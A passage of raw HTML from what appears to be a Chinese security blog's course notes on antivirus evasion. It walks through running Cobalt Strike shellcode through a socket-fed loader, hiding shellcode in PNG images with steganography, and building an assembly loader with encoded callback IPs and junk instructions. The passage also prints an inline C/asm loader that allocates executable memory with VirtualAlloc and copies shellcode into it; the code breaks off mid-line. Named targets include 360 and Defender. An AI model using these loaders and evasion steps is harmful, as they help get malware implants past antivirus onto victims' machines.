title="将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc&#x3D;base64.b64decode(data)下面就是data未编码之前将要传入的数据"></a>将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc&#x3D;base64.b64decode(data)下面就是data未编码之前将要传入的数据</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151327660.png" alt="image-20230510151327660"></p><h6 id="去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入"><a href="#去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入" class="headerlink" title="去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入"></a>去掉后面4行的data数据，这里服务端直接修改为执行sc，sc就是data解码后的数据，data为后面手动编码输入</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510145429276.png" alt="image-20230510145429276"></p><h6 id="将data上线代码编码"><a href="#将data上线代码编码" class="headerlink" title="将data上线代码编码"></a>将data上线代码编码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151832027.png" alt="image-20230510151832027"></p><h6 id="输入数据以后执行出现了错误，超出了长度"><a href="#输入数据以后执行出现了错误，超出了长度" class="headerlink" title="输入数据以后执行出现了错误，超出了长度"></a>输入数据以后执行出现了错误，超出了长度</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151942915.png" alt="image-20230510151942915"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510151636123.png" alt="image-20230510151636123"></p><h6 id="在服务端代码里面data接上没有被接收的余下代码"><a href="#在服务端代码里面data接上没有被接收的余下代码" class="headerlink" title="在服务端代码里面data接上没有被接收的余下代码"></a>在服务端代码里面data接上没有被接收的余下代码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510152930011.png" alt="image-20230510152930011"></p><h6 id="再次执行后上线成功"><a href="#再次执行后上线成功" class="headerlink" title="再次执行后上线成功"></a>再次执行后上线成功</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153003484.png" alt="image-20230510153003484"></p><h6 id="这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0-0-0-0，要不然可能无法上线-，因为主机可能有多个网卡，就无法上线，所以输入0-0-0-0监听任意网卡"><a href="#这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0-0-0-0，要不然可能无法上线-，因为主机可能有多个网卡，就无法上线，所以输入0-0-0-0监听任意网卡" class="headerlink" title="这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0.0.0.0，要不然可能无法上线 ，因为主机可能有多个网卡，就无法上线，所以输入0.0.0.0监听任意网卡"></a>这里如果不是本地测试，是要在别的主机上线，那么服务端这里要改为0.0.0.0，要不然可能无法上线 ，因为主机可能有多个网卡，就无法上线，所以输入0.0.0.0监听任意网卡</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153518340.png" alt="image-20230510153518340"></p><h6 id="最后上线成功"><a href="#最后上线成功" class="headerlink" title="最后上线成功"></a>最后上线成功</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510153744234.png" alt="image-20230510153744234"></p><h3 id="Python-Images-将shellcode隐写进图片内"><a href="#Python-Images-将shellcode隐写进图片内" class="headerlink" title="#Python-Images-将shellcode隐写进图片内"></a>#Python-Images-将shellcode隐写进图片内</h3><p>参考：<a href="https://mp.weixin.qq.com/s/c8U2M_iJ8pWaI50sH8u9Hw">Python3 图片隐写术的实现 (qq.com)</a></p><p><code>加密:RGBAencodeDataInImage(im, arguments[&#39;&lt;text&gt;&#39;]).save(arguments[&#39;&lt;encodedImage&gt;&#39;])</code></p><p><code>解密：im = Image.open(arguments[&#39;&lt;encodedImage&gt;&#39;])</code></p><p><strong>image-1.py：</strong></p><h6 id="将链接里面的代码复制下来，命名为image-1-py"><a href="#将链接里面的代码复制下来，命名为image-1-py" class="headerlink" title="将链接里面的代码复制下来，命名为image-1.py"></a>将链接里面的代码复制下来，命名为image-1.py</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154650221.png" alt="image-20230510154650221"></p><h6 id="找一张图片，需要png格式的"><a href="#找一张图片，需要png格式的" class="headerlink" title="找一张图片，需要png格式的"></a>找一张图片，需要png格式的</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154829809.png" alt="image-20230510154829809"></p><h6 id="用脚本进行加密-e加密-d解密"><a href="#用脚本进行加密-e加密-d解密" class="headerlink" title="用脚本进行加密 -e加密 -d解密"></a>用脚本进行加密 -e加密 -d解密</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510154936688.png" alt="image-20230510154936688"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155055736.png" alt="image-20230510155055736"></p><h6 id="发现隐写的图片变小了"><a href="#发现隐写的图片变小了" class="headerlink" title="发现隐写的图片变小了"></a>发现隐写的图片变小了</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155137243.png" alt="image-20230510155137243"></p><h6 id="所以可以将上线代码作为加密密文"><a href="#所以可以将上线代码作为加密密文" class="headerlink" title="所以可以将上线代码作为加密密文"></a>所以可以将上线代码作为加密密文</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511010931648.png" alt="image-20230511010931648"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511010843707.png" alt="image-20230511010843707"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511011347615.png" alt="image-20230511011347615"></p><h6 id="修改为"><a href="#修改为" class="headerlink" title="修改为"></a>修改为</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511011456854.png" alt="image-20230511011456854"></p><h6 id="在image-1-py中，ctrl-f搜索解密函数RGBAdecodeImage-其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可"><a href="#在image-1-py中，ctrl-f搜索解密函数RGBAdecodeImage-其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可" class="headerlink" title="在image-1.py中，ctrl+f搜索解密函数RGBAdecodeImage,其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可"></a>在image-1.py中，ctrl+f搜索解密函数RGBAdecodeImage,其所在的地方不用删除，删除一些无关的函数，加密的也不需要了，保留一些编码的代码和解密的代码即可</h6><h6 id="因为图片里面只需要有解码功能，将里面的shellcode解码执行即可"><a href="#因为图片里面只需要有解码功能，将里面的shellcode解码执行即可" class="headerlink" title="因为图片里面只需要有解码功能，将里面的shellcode解码执行即可"></a>因为图片里面只需要有解码功能，将里面的shellcode解码执行即可</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510215524184.png" alt="image-20230510215524184"></p><h6 id="执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了"><a href="#执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了" class="headerlink" title="执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了"></a>执行后发现报错了，原因是刚才固定了生成的图片的名字，但是没有把那个接收新生成图片名的变量删了</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510155900530.png" alt="image-20230510155900530"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510160014845.png" alt="image-20230510160014845"></p><h6 id="再次执行成功上线"><a href="#再次执行成功上线" class="headerlink" title="再次执行成功上线"></a>再次执行成功上线</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230510222338649.png" alt="image-20230510222338649"></p><p><strong>image-2.py：</strong></p><h6 id="image-2-py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文"><a href="#image-2-py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文" class="headerlink" title="image-2.py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文"></a>image-2.py因为里面有了shellcode的执行代码了，所以只需要隐写上线的shellcode即可，所以可以将上线代码作为加密密文</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511012856974.png" alt="image-20230511012856974"></p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511005141627.png" alt="image-20230511005141627"></p><h6 id="执行上面的命令"><a href="#执行上面的命令" class="headerlink" title="执行上面的命令"></a>执行上面的命令</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511005300451.png" alt="image-20230511005300451"></p><h6 id="解密了随之也就上线成功，可以进行py2exe打包"><a href="#解密了随之也就上线成功，可以进行py2exe打包" class="headerlink" title="解密了随之也就上线成功，可以进行py2exe打包"></a>解密了随之也就上线成功，可以进行py2exe打包</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230511084706895.png" alt="image-20230511084706895"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day111 免杀对抗-Java&amp;ASM&amp;汇编CS调用&amp;内联C&amp;MSF源码特征修改&amp;Jar打包</title>
      <link href="/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/"/>
      <url>/2023/04/27/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/8i3IGPgDn9GeJQ6a1zq34Q.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、ASM-CS-单汇编&amp;内联C</p><p>2、JAVA-MSF-源码修改&amp;打包</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h4 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h4><p>X60 Defender 某绒 管家 VT等</p><h4 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h4><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h4 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h4><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#➢-ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>➢ ASM-ShellCode-纯汇编&amp;内联C混编-CS</h4><h4 id="➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF"><a href="#➢-JAVA-ShellCode-源码修改-amp-打包EXE-MSF" class="headerlink" title="➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF"></a>➢ JAVA-ShellCode-源码修改&amp;打包EXE-MSF</h4></blockquote><h3 id="ASM-ShellCode-纯汇编-amp-内联C混编-CS"><a href="#ASM-ShellCode-纯汇编-amp-内联C混编-CS" class="headerlink" title="#ASM-ShellCode-纯汇编&amp;内联C混编-CS"></a>#ASM-ShellCode-纯汇编&amp;内联C混编-CS</h3><h5 id="1、编译汇编代码实现CS免杀"><a href="#1、编译汇编代码实现CS免杀" class="headerlink" title="1、编译汇编代码实现CS免杀"></a>1、编译汇编代码实现CS免杀</h5><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093005342.png" alt="image-20230504093005342"></p><p>来源：<a href="https://forum.butian.net/share/1536">奇安信攻防社区-编译汇编代码实现免杀 (butian.net)</a></p><p>IP地址：</p><p>30h,2fh,2dh,30h,32h,2fh,2dh,33h,2dh,31h,2fh,33h,00h</p><p>10.130.4.204</p><p>30&#x3D;1，2f&#x3D;0，2d&#x3D;.，32&#x3D;3，33&#x3D;4，31&#x3D;2 依次内推</p><p>47.94.236.117</p><p>33h,36h,2dh,38h,33h,2dh,31h,32h,35h,2dh,30h,30h,36h,00h</p><p>端口：82&#x3D;52h 88&#x3D;28h</p><p>编译器下载：<a href="https://www.masm32.com/">https://www.masm32.com/</a></p><p>编译为obj文件：ml &#x2F;c &#x2F;coff &#x2F;Cp test.asm</p><p>生成exe文件：link &#x2F;subsystem:console &#x2F;libpath:c:\masm32\lib test.obj</p><h5 id="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"><a href="#2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）" class="headerlink" title="2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）"></a>2、内联C混编，花指令-生成导入（相当于生成一些没有的东西用来干扰）</h5><ul><li><h5 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h5></li></ul><h6 id="把软件拖进去查看入口点"><a href="#把软件拖进去查看入口点" class="headerlink" title="把软件拖进去查看入口点"></a>把软件拖进去查看入口点</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506204759807.png" alt="image-20230506204759807"></p><h6 id="将上面的二进制入口点数据替换到此处"><a href="#将上面的二进制入口点数据替换到此处" class="headerlink" title="将上面的二进制入口点数据替换到此处"></a>将上面的二进制入口点数据替换到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205016545.png" alt="image-20230506205016545"></p><h6 id="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"><a href="#替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处" class="headerlink" title="替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处"></a>替换后，打开Ollydbg，将exe文件拖拽进去反编译，找到空白处，将上面的花指令粘贴到此处</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205150820.png" alt="image-20230506205150820"></p><h6 id="修改后全选内容右键"><a href="#修改后全选内容右键" class="headerlink" title="修改后全选内容右键"></a>修改后全选内容右键</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205527149.png" alt="image-20230506205527149"></p><h6 id="选择全部复制"><a href="#选择全部复制" class="headerlink" title="选择全部复制"></a>选择全部复制</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205545080.png" alt="image-20230506205545080"></p><h6 id="保存为新文件"><a href="#保存为新文件" class="headerlink" title="保存为新文件"></a>保存为新文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230506205637669.png" alt="image-20230506205637669"></p><ul><li><h5 id="内联C混编"><a href="#内联C混编" class="headerlink" title="内联C混编"></a>内联C混编</h5></li></ul><p>int main() {</p><p>​    LPVOID lp &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “VirtualAlloc”);</p><p>​    size_t dw_size &#x3D; sizeof(buf);</p><p>​    void* exec &#x3D; NULL;</p><p>​    __asm</p><p>​    {</p><p>​        push 0x40; &#x2F;&#x2F;可读可写可执行页参数入栈</p><p>​        push 0x1000; &#x2F;&#x2F;MEM_COMMIT参数值入栈</p><p>​        mov eax, dw_size; &#x2F;&#x2F;定义空间大小</p><p>​        push eax; &#x2F;&#x2F;将空间大小入栈</p><p>​        push 0; &#x2F;&#x2F;由系统自行决定内存空间起始地址入栈</p><p>​        mov eax, lp; &#x2F;&#x2F;移动到virtualAlloc函数地址</p><p>​        call eax; &#x2F;&#x2F;运行该函数</p><p>​        mov exec, eax;&#x2F;&#x2F;调用地址</p><p>​    }</p><p>​    LPVOID op &#x3D; GetProcAddress(LoadLibraryA(“kernel32.dll”), “RtlMoveMemory”);</p><p>​    __asm</p><p>​    {</p><p>​        mov eax, dw_size;</p><p>​        push eax;</p><p>​        lea eax, buf;</p><p>​        push eax;</p><p>​        mov ecx, exec;</p><p>​        push ecx;</p><p>​        mov eax, op;</p><p>​        call eax;</p><p>​    }</p><p>​    __asm</p><p>​    {</p><p>​        jmp 